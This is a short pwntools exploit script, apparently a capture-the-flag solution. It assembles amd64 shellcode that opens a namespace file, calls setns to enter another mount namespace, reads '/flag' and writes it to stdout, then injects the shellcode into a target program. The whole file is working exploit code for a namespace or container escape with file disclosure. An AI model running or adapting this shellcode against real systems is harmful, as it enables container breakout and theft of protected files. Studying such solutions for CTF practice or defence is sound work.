#!/bin/python

import os
import sys
from pwn import * 
from pwn import shellcraft as sc 

context.arch = 'amd64'
WRITABLE_MEM = 0x1337000 + 0x200
FLAG_LEN = 60

FILE = '/proc/1/ns'

argv = None
if (len(sys.argv) > 2):
    argv = ['sudo', 'strace', sys.argv[1], FILE]
else:
    argv = [sys.argv[1], FILE]


sc_bytes = (sc.open('/data/mnt', os.O_RDONLY)
          + sc.setns(3, 0)
          + sc.open('/flag', os.O_RDONLY)
          + sc.sendfile(1, 4, 0, FLAG_LEN)
)
asm_code = asm(sc_bytes)

proc = process(argv)
proc.send(asm_code)
proc.interactive()
